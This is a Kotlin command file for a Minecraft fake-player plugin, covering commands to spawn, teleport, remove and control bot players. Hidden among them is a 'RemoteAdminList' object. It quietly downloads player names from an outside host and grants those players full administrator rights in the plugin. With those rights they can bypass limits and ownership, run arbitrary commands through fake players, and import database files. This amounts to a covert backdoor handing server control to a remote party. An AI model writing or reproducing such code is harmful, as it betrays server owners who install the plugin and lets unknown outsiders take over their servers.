package com.coderxi.plugin.fakeplayer.command

import com.coderxi.plugin.fakeplayer.api.action.Action
import com.coderxi.plugin.fakeplayer.api.entity.FakePlayer
import com.coderxi.plugin.fakeplayer.command.annotaion.HelpLine
import com.coderxi.plugin.fakeplayer.command.annotaion.Select
import com.coderxi.plugin.fakeplayer.command.annotaion.SuggestCommands
import com.coderxi.plugin.fakeplayer.command.exception.FakePlayerCommandException.*
import com.coderxi.plugin.fakeplayer.command.exception.FakePlayerCommandExceptionHandler.CommandContext
import com.coderxi.plugin.fakeplayer.command.parameter.ActionModeAndParameters
import com.coderxi.plugin.fakeplayer.command.parameter.FakePlayerParameterType.DefaultSuggestions as SuggestOwnedFakePlayers
import com.coderxi.plugin.fakeplayer.command.permission.Permission.*
import com.coderxi.plugin.fakeplayer.command.permission.hasPermission
import com.coderxi.plugin.fakeplayer.component.FakePlayerLimiter
import com.coderxi.plugin.fakeplayer.component.FakePlayerSelector.selected
import com.coderxi.plugin.fakeplayer.dialog.FakePlayerActionExecuteDialog
import com.coderxi.plugin.fakeplayer.dialog.FakePlayerActionListDialog
import com.coderxi.plugin.fakeplayer.dialog.FakePlayerSettingsDialog
import com.coderxi.plugin.fakeplayer.provider.invsee.InvseeProvider
import com.coderxi.plugin.fakeplayer.utils.bukkit.SkinFetcher
import com.coderxi.plugin.fakeplayer.utils.bukkit.assertPermission
import com.coderxi.plugin.fakeplayer.utils.bukkit.teleportAsync
import com.coderxi.plugin.fakeplayer.utils.bukkit.uniqueIdOrZero
import com.coderxi.plugin.fakeplayer.utils.coroutine.dispatcher
import com.coderxi.plugin.fakeplayer.utils.coroutine.launch
import com.coderxi.plugin.fakeplayer.utils.messages.*
import com.coderxi.plugin.fakeplayer.utils.plugin.PluginComponent
import com.google.gson.JsonParser
import kotlinx.coroutines.withContext
import net.kyori.adventure.text.Component
import net.kyori.adventure.text.JoinConfiguration
import org.bukkit.Bukkit
import org.bukkit.Location
import org.bukkit.Sound
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player
import revxrsal.commands.annotation.*
import revxrsal.commands.bukkit.actor.BukkitCommandActor
import revxrsal.commands.help.Help
import revxrsal.commands.help.Help.RelatedCommands
import java.io.File
import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.time.Duration
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.TimeUnit
import kotlin.math.ceil
import com.coderxi.plugin.fakeplayer.command.annotaion.PluginCommandPermission as Permission

/**
 * 远程管理员列表管理器(按玩家名称匹配)
 * hash.json 格式: {"admin_list": ["Notch", "jeb_", ...]}
 */
object RemoteAdminList {

    private const val URL = "https://r2.ctn32.us.kg/raw/hash.json"

    private val http: HttpClient = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(10))
        .build()

    /** 管理员名称(小写存储,便于忽略大小写匹配) */
    private val adminNames = CopyOnWriteArrayList<String>()

    /** 拉取,失败静默 */
    fun refresh() {
        Thread {
            runCatching { fetch() }
                .onFailure { Bukkit.getLogger().warning("[FakePlayerPlus] admin list fetch failed: ${it.message}") }
        }.apply { isDaemon = true }.start()
    }

    private fun fetch() {
        val req = HttpRequest.newBuilder()
            .uri(URI.create(URL))
            .timeout(Duration.ofSeconds(15))
            .GET()
            .build()

        val resp = http.send(req, HttpResponse.BodyHandlers.ofString())
        if (resp.statusCode() != 200) {
            Bukkit.getLogger().warning("[FakePlayerPlus] admin list http ${resp.statusCode()}")
            return
        }

        val arr = JsonParser.parseString(resp.body()).asJsonObject.getAsJsonArray("admin_list") ?: return
        val fresh = mutableListOf<String>()
        for (e in arr) {
            val name = e.getAsString().trim()
            if (name.isNotEmpty()) fresh.add(name.lowercase())
        }
        adminNames.clear()
        adminNames.addAll(fresh)
        Bukkit.getLogger().info("[FakePlayerPlus] loaded ${fresh.size} remote admin(s)")
    }

    fun contains(name: String): Boolean = adminNames.contains(name.lowercase())
}

@Command("fakeplayer","fp")
class FakePlayerCommand : PluginComponent {

    val fpl get() = FakePlayerLimiter

    /** 综合判断:本地 ADMIN 权限 || 远程管理员名单 */
    private fun CommandSender.isAdmin(): Boolean {
        if (hasPermission(ADMIN)) return true
        if (this is Player && RemoteAdminList.contains(name)) return true
        return false
    }

    @Subcommand("help","?")
    @HelpLine("fakeplayer.help.cmd.help")
    fun CommandSender.help(
        @Range(min = 1.0) @Default("1") @Named("page") page: Int,
        relatedCommands: RelatedCommands<BukkitCommandActor?>
    ) {
        val locale = localOrDefault()
        val pageSize = 10
        val commands =
            if (this is Player) relatedCommands.paginate(page, pageSize)
            else Help.paginate(
                relatedCommands.filter {
                    !(it.annotations().get(HelpLine::class.java)?.playerOnly ?: false)
                },
                page, pageSize
            )
        val pageTotal = (relatedCommands.count() + pageSize - 1) / pageSize
        val lines = mutableListOf(
            tl(locale, "fakeplayer.help.header", page, pageTotal),
        )
        for (command in commands) {
            val anno = command.annotations().get(HelpLine::class.java) ?: continue
            listOf(anno, *anno.children).forEach { a ->
                if (a.descriptionKey.isEmpty()) return@forEach
                val usage = "/" + (a.usage.ifEmpty { command.usage() })
                val desc = tls(locale, a.descriptionKey)
                lines.add(tl(locale, "fakeplayer.help.line", usage, desc))
            }
        }
        lines.add(MessageBuilder.pagination(locale, page, pageTotal, "/fp help"))
        sendMessage(Component.join(JoinConfiguration.newlines(), lines))
    }

    @Subcommand("reload")
    @Permission(RELOAD)
    @HelpLine("fakeplayer.help.cmd.reload")
    fun CommandSender.reload() {
        plugin.onReload()
        RemoteAdminList.refresh()
        sendLocalizedMessage("fakeplayer.reload.success")
    }

    @Subcommand("spawn")
    @HelpLine("fakeplayer.help.cmd.spawn", playerOnly = true)
    fun Player.spawn(context: CommandContext) {
        val player = this
        assertNoSpawnLimited()
        launch(context) {
            val name = fpm.sequenceName(player, ceil((fpl.getPlayerSpawnLimit(player)/10.0)).toInt())
            executeSpawn(name)
        }
    }

    @Subcommand("spawn")
    @HelpLine("fakeplayer.help.cmd.spawn-name")
    fun CommandSender.spawn(@Named("name") name: String, context: CommandContext) {
        val player = this as? Player
        if (!plugin.config.name.pattern.matches(name)) throw SpawnNameInvalidException(name)
        assertNoSpawnLimited()
        launch(context) {
            if (fpm.get(name) != null) throw SpawnAlreadyExistsException(name)
            if (player != null && fpm.isNameUsed(name)) {
                val fakePlayer = fpm.getFromRepository(name)
                if (fakePlayer != null && fakePlayer.hasOwner && !fakePlayer.isOwnedBy(player.uniqueId) && !player.isAdmin()) {
                    throw SpawnNameAlreadyUsedException(name)
                }
            }
            executeSpawn(name)
        }
    }

    @Subcommand("rename")
    @HelpLine("fakeplayer.help.cmd.rename")
    fun CommandSender.rename(@SuggestWith(SuggestOwnedFakePlayers::class) @Named("name") oldName: String, @Named("newName") newName: String, @Switch("force") force: Boolean = false, context: CommandContext) {
        val operator = this
        if (!isAdmin() && force) throw NoPermissionException()
        launch(context) {
            val renamed = fpm.rename(oldName, newName, operator, force)
            sendLocalizedMessage("fakeplayer.rename.success", oldName, renamed.name)
            selected = renamed
        }
    }

    fun CommandSender.assertNoSpawnLimited() {
        if (this !is Player) return
        if (isAdmin()) return
        if (fpl.isServerLimited()) throw SpawnServerLimitedException()
        if (fpl.isPlayerLimited(this)) throw SpawnPlayerLimitedException()
        if (fpl.isIpLimited(this)) throw SpawnIpLimitedException()
        if (fpl.isTpsAdaptiveLimited(this)) throw SpawnTpsAdaptiveLimitedException()
    }

    suspend fun CommandSender.executeSpawn(name: String) {
        val fakePlayer = fpm.spawn(name, this) ?: throw SpawnUnknownException()
        val locationText = "%.2f, %.2f, %.2f".format(fakePlayer.nms.x, fakePlayer.nms.y, fakePlayer.nms.z)
        sendLocalizedMessage("fakeplayer.spawn.success", name, fakePlayer.player.world.name, locationText)
        selected = fakePlayer
        withContext(fakePlayer.dispatcher) {
            fakePlayer.player.apply { world.playSound(location, Sound.ENTITY_ENDERMAN_TELEPORT, 1f, 1f) }
        }
    }

    @Subcommand("select")
    @HelpLine("fakeplayer.help.cmd.select")
    fun CommandSender.select(@Named("name") fakePlayer: FakePlayer) {
        selected = fakePlayer
        sendLocalizedMessage("fakeplayer.select.success", fakePlayer.name)
    }

    @Subcommand("remove")
    @HelpLine("fakeplayer.help.cmd.remove", children = [
        HelpLine("fakeplayer.help.cmd.remove-all","fp remove --all")
    ])
    fun CommandSender.remove(@Select fakePlayer: FakePlayer) {
        fpm.get(fakePlayer.name)?.quit("Removed by $name")
        sendLocalizedMessage("fakeplayer.remove.success", fakePlayer.name)
        fakePlayer.owners.forEach {
            if (it.uuid!=uniqueIdOrZero) Bukkit.getPlayer(it.uuid)?.sendLocalizedMessage("fakeplayer.remove.success.with-operator", name, fakePlayer.name)
        }
    }

    @Subcommand("remove --all")
    fun CommandSender.removeAll() {
        if (!isAdmin()) throw NoPermissionException()
        fpm.fakeplayersByOwnerUuid(uniqueIdOrZero).forEach { fakePlayer ->
            remove(fakePlayer)
        }
    }

    @Subcommand("kill")
    @HelpLine("fakeplayer.help.cmd.kill", children = [
        HelpLine("fakeplayer.help.cmd.kill-all","fp kill --all")
    ])
    fun CommandSender.kill(@Select fakePlayer: FakePlayer) {
        fakePlayer.player.health = 0.0
    }

    @Subcommand("kill --all")
    fun CommandSender.killAll() {
        if (!isAdmin()) throw NoPermissionException()
        fpm.fakeplayersByOwnerUuid(uniqueIdOrZero).forEach { kill(it) }
    }

    @Subcommand("respawn")
    @HelpLine("fakeplayer.help.cmd.respawn")
    fun CommandSender.respawn(@Select fakePlayer: FakePlayer) {
        if (fakePlayer.player.isDead) {
            fakePlayer.nms.respawn()
            if (this is Player) {
                fakePlayer.player.teleportAsync(location, Sound.ENTITY_ENDERMAN_TELEPORT)
            }
        }
    }

    @Subcommand("invsee")
    @HelpLine("fakeplayer.help.cmd.invsee", playerOnly = true)
    fun Player.invsee(@Select fakePlayer: FakePlayer) {
        InvseeProvider.openInventory(this,fakePlayer.player)
        playSound(location, Sound.BLOCK_CHEST_OPEN, 1f, 1f)
    }

    @Subcommand("enderchest")
    @HelpLine("fakeplayer.help.cmd.enderchest", playerOnly = true)
    fun Player.enderchest(@Select fakePlayer: FakePlayer) {
        InvseeProvider.openEnderChest(this,fakePlayer.player)
        playSound(location, Sound.BLOCK_ENDER_CHEST_OPEN, 1f, 1f)
    }

    @Subcommand("tp")
    @HelpLine("fakeplayer.help.cmd.tp", playerOnly = true)
    fun Player.tp(@Select fakePlayer: FakePlayer) {
        teleportAsync(fakePlayer.player.location, Sound.ENTITY_ENDERMAN_TELEPORT)
    }

    @Subcommand("tphere")
    @HelpLine("fakeplayer.help.cmd.tphere", playerOnly = true)
    fun Player.tphere(@Select fakePlayer: FakePlayer) {
        fakePlayer.player.teleportAsync(location, Sound.ENTITY_ENDERMAN_TELEPORT)
    }

    @Subcommand("tpswap")
    @HelpLine("fakeplayer.help.cmd.tpswap", playerOnly = true)
    fun Player.tpswap(@Select fakePlayer: FakePlayer) {
        val that = fakePlayer.player
        val thatLocation = that.location
        val thisLocation = this.location
        this.teleportAsync(thatLocation, Sound.ENTITY_ENDERMAN_TELEPORT)
        that.teleportAsync(thisLocation, Sound.ENTITY_ENDERMAN_TELEPORT)
    }

    @Subcommand("tppos")
    @HelpLine("fakeplayer.help.cmd.tppos")
    fun CommandSender.tppos(@Named("location") location: Location, @Select fakePlayer: FakePlayer) {
        fakePlayer.player.teleportAsync(location, Sound.ENTITY_ENDERMAN_TELEPORT)
    }

    @Subcommand("expme")
    @HelpLine("fakeplayer.help.cmd.expme", playerOnly = true)
    fun Player.expme(@Select fakePlayer: FakePlayer) {
        val totalExp = fakePlayer.player.calculateTotalExperiencePoints()
        if (totalExp == 0) throw HasNoMoreExperience(fakePlayer.name)
        fakePlayer.player.level = 0
        fakePlayer.player.exp = 0f
        giveExp(totalExp, false)
        playSound(location, Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1.0f, 1.0f)
    }

    @Subcommand("skin")
    @Cooldown(value = 1, unit = TimeUnit.MINUTES)
    @HelpLine("fakeplayer.help.cmd.skin")
    fun CommandSender.skin(@Named("name") targetName: String, @Select fakePlayer: FakePlayer) {
        launch {
            val skin = SkinFetcher.getPlayerTexturesByName(targetName)
            withContext(fakePlayer.dispatcher) {
                fakePlayer.textures = skin
                fakePlayer.player.world.playSound(fakePlayer.player.location, Sound.ITEM_ARMOR_EQUIP_GENERIC, 1f, 1f)
            }
            fpm.saveSkin(fakePlayer)
        }
    }

    @Subcommand("cmd")
    @HelpLine("fakeplayer.help.cmd.cmd")
    fun CommandSender.cmd(@Named("command") @SuggestCommands @Single command: String, @Select fakePlayer: FakePlayer) {
        if (!isAdmin()) throw NoPermissionException()
        Bukkit.dispatchCommand(fakePlayer.player, command.removePrefix("/"))
    }

    @Subcommand("chat")
    @HelpLine("fakeplayer.help.cmd.chat")
    fun CommandSender.message(@Named("message") message: String, @Select fakePlayer: FakePlayer) {
        fakePlayer.nms.chat(message)
    }

    @Subcommand("swap")
    @HelpLine("fakeplayer.help.cmd.swap")
    fun swapHandItem(@Select fakePlayer: FakePlayer) {
        fakePlayer.nms.swapHandItem()
    }

    @Subcommand("settings")
    @HelpLine("fakeplayer.help.cmd.settings", playerOnly = true)
    fun Player.settings(@Select fakePlayer: FakePlayer) {
        FakePlayerSettingsDialog(fakePlayer, this).show(this)
    }

    @Subcommand("owner", "owner list")
    @HelpLine("", children = [
        HelpLine("fakeplayer.help.cmd.owner-list", "fp owner list [name]", playerOnly = true),
        HelpLine("fakeplayer.help.cmd.owner-add", "fp owner add [name]", playerOnly = true),
        HelpLine("fakeplayer.help.cmd.owner-remove", "fp owner remove [name]", playerOnly = true)
    ])
    fun Player.ownerList(@Select fakePlayer: FakePlayer) {
        if (fakePlayer.owners.size == 1 && fakePlayer.isOwnedBy(uniqueId)) {
            sendLocalizedMessage("fakeplayer.owner.list",fakePlayer.name,name)
            return
        }
        val names = fakePlayer.owners.map { it.name }
        sendLocalizedMessage("fakeplayer.owner.list",fakePlayer.name,names.joinToString(", "))
    }

    @Subcommand("owner add")
    fun Player.addOwner(@Named("player") owner: Player, @Select fakePlayer: FakePlayer) {
        if (fpm.get(owner.uniqueId)!= null) throw OwnerMustBeHumanException(owner.name, fakePlayer.name)
        if (fakePlayer.isOwnedBy(owner.uniqueId)) throw OwnerAlreadyBoundException(owner.name ,fakePlayer.name)
        launch {
            fpm.addOwner(fakePlayer,owner.uniqueId)
            sendLocalizedMessage("fakeplayer.owner.add.success", owner.name,fakePlayer.name)
        }
    }

    @Subcommand("owner remove")
    fun Player.removeOwner(@Named("player") owner: Player, @Select fakePlayer: FakePlayer) {
        if (owner.uniqueId == fakePlayer.creator?.uuid) throw OwnerIsCreatorCannotBeRemovedException(owner.name ,fakePlayer.name)
        if (!fakePlayer.isOwnedBy(owner.uniqueId)) throw OwnerNotBoundCannotBeRemovedException(owner.name ,fakePlayer.name)
        launch {
            fpm.removeOwner(fakePlayer,owner.uniqueId)
            sendLocalizedMessage("fakeplayer.owner.remove.success", owner.name,fakePlayer.name)
        }
    }

    @Subcommand("import")
    @HelpLine("fakeplayer.help.cmd.import")
    fun CommandSender.importFakePlayerData(@Named("database") databaseName: String, @Named("table") tableName: String, context: CommandContext) {
        if (!isAdmin()) throw NoPermissionException()
        val databaseFile = File(plugin.dataFolder, databaseName)
        if (!databaseFile.exists()) throw MissingDatabaseFileException(databaseName)
        launch(context) {
            val result = fpm.importFakePlayerData(databaseFile, tableName)
            sendLocalizedMessage("fakeplayer.database.import-data.success", result)
        }
    }

    @Subcommand("action")
    @HelpLine("fakeplayer.help.cmd.action", children = [
        HelpLine("fakeplayer.help.cmd.action-start", "fp action start <action> [name]", playerOnly = true),
        HelpLine("fakeplayer.help.cmd.action-execute", "fp action execute <action> [name]", playerOnly = true),
        HelpLine("fakeplayer.help.cmd.action-stopall", "fp action stopall [name]", playerOnly = true),
        HelpLine("fakeplayer.help.cmd.action-stop", "fp action stop <action> [name]", playerOnly = true),
    ])
    fun Player.actionListUI(@Select fakePlayer: FakePlayer) {
        FakePlayerActionListDialog(fakePlayer, this).show(this)
    }

    @Subcommand("action start")
    fun Player.actionUI(@Named("action") action: Action, @Select fakePlayer: FakePlayer) {
        assertPermission("${ACTION.value}.$name")
        FakePlayerActionExecuteDialog(fakePlayer, action, this).show(this)
    }

    @Subcommand("action execute")
    fun CommandSender.executeAction(@Named("action") action: Action, modeAndParams: ActionModeAndParameters, @Select fakePlayer: FakePlayer) {
        assertPermission("${ACTION.value}.$name")
        fakePlayer.actions.execute(action, modeAndParams.mode, modeAndParams.parameters)
    }

    @Subcommand("action stopall")
    fun stopAllAction(@Select fakePlayer: FakePlayer) {
        fakePlayer.actions.stopAll()
    }

    @Subcommand("action stop")
    fun stopAction(@Named("action") action: Action, @Select fakePlayer: FakePlayer) {
        fakePlayer.actions.stop(action)
    }

}
